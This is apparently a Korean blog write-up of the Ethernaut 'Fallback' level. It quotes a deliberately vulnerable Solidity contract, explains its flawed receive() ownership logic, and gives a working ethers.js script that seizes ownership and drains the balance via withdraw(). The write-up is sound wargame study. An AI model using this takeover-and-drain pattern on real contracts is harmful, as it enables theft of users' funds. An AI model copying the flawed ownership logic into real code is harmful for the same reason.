---
title: Ethernaut::Fallback
author: ieuns
date: 2025-11-19 20:22:00 +0900
categories: [Web3, Solidity]
tags: [Ethernaut]
---

## `0x01` Fallback
---
이번 문제의 설명은 아래와 같습니다.

```
Look carefully at the contract's code below.
아래 컨트랙트 코드를 잘 살펴보세요.

You will beat this level if
이 레벨을 클리어하려면

•  you claim ownership of the contract
•  컨트랙트의 소유권을 획득해야 하고

•  you reduce its balance to 0
•  컨트랙트의 잔고를 0으로 만들어야 합니다.


Things that might help
도움이 될 만한 것들

•  How to send ether when interacting with an ABI
•  ABI를 사용할 때 이더를 전송하는 방법

•  How to send ether outside of the ABI
•  ABI를 사용하지 않고 이더를 보내는 방법

•  Converting to and from wei/ether units (see help() command)
•  wei와 ether 단위 변환(도움말은 help() 명령어 참고)

•  Fallback methods
•  Fallback 메서드 활용
```

이번 문제는 [Fallback](https://ieuns.kr/posts/Fallback/) 함수에 대한 문제라는 것을 알 수 있습니다.

이번 문제부터는 코드도 함께 제공되니 한 번 분석해보겠습니다.

## `0x02` Code Audit
---

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

### Key Variables and Structures
---
- `contributions`: 각 주소별로 컨트랙트에 얼마나 입금했는지 기록하는 매핑 (단위: wei)
- `owner`: 현재 컨트랙트 소유자 주소
- `constructor`: 배포자(최초 소유자)의 `contributions`를 `1000 ether`로 설정, 기본 소유자 지정

### Core Functions and Logic
---

**`contribute()`**
- 0.001 ether 미만만 입금 가능하도록 제한
- 해당 주소의 누적 입금액(contributions)에 더함
- 만약 명시적 소유자(owner)보다 더 많이 입금된 주소가 있으면 owner를 그 주소로 변경

> 즉, 새로운 “최대 기여자”가 자동으로 오너가 됨


**`getContribution()`**
- 호출자(msg.sender)의 자기 입금 총액을 반환


**`withdraw()`**
- 오직 owner만 호출 가능 (onlyOwner modifier 적용)
- 컨트랙트의 모든 잔고를 owner 계정으로 전송


**`receive()`**
- msg.value > 0 (즉, 0보다 큰 이더 입금 필수)
- 기존에 `contributionsmsg.sender > 0` 이어야 함 (즉, 최소 한번 입금한 적이 있어야 함)
    - 그럴 경우 owner를 그 주소(msg.sender)로 변경

> 즉, 아주 소량이라도 입금한 유저가 임의의 이더 전송으로 owner가 될 수 있음



## `0x03` Solve

문제가 요구하는 것이 컨트랙트 소유권 획득, 컨트랙트 잔고를 0으로 만드는 것이었습니다.

문제가 요구하는 바를 달성하기 위해 아래와 같은 시나리오를 작성해볼 수 있습니다.
1. 0.001 ether 미만으로 한 번이라도 `contribute()` 실행한 뒤, `receive()`로 직접 이더 전송하면 owner 탈취. (소유권 획득)
2. owner 권한이 생기면 `withdraw()`로 잔고를 전부 빼낼 수 있음. (잔고를 0으로 만듦)



위의 시나리오를 코드로 작성해보면 아래와 같습니다.

```javascript
require("dotenv").config();
const { ethers } = require("ethers");

async function main() {
    const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
    const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    const fallbackABI = [
        "function contribute() public payable",
        "function getContribution() public view returns (uint)",
        "function owner() public view returns (address)",
        "function withdraw() public"
    ];

    const contract = new ethers.Contract(
        process.env.FALLBACK_ADDRESS,
        fallbackABI,
        wallet
    );

    console.log("현재 지갑:", wallet.address);

    // contribute를 1 wei로 호출
    console.log("\n[1] contribute() 호출");
    const tx1 = await contract.contribute({ value: 1 });
    await tx1.wait();
    console.log("contribute 완료");

    // ETH 1 wei 보내서 fallback() 트리거 → owner 획득
    console.log("\n[2] fallback() 호출 = ETH 송금");
    const tx2 = await wallet.sendTransaction({
        to: process.env.FALLBACK_ADDRESS,
        value: 1,  // fallback() 실행 조건: 0보다 큰 값
    });
    await tx2.wait();
    console.log("fallback() trigger 완료");

    // owner 확인
    const owner = await contract.owner();
    console.log("\n현재 owner:", owner);

    if (owner.toLowerCase() !== wallet.address.toLowerCase()) {
        console.log("owner 권한 획득 실패");
        return;
    }
    console.log("owner 권한 획득");

    // withdraw() 호출
    console.log("\n[3] withdraw() 실행하여 자금 획득");
    const tx3 = await contract.withdraw();
    await tx3.wait();
    console.log("withdraw 완료!");

    console.log("\nSolve 🎉");
}

main().catch(console.error);

```

해당 코드를 실행시킨 후 "Solve 🎉" 로그가 찍힌 후 제출하면 Fallback 문제가 풀리게 됩니다.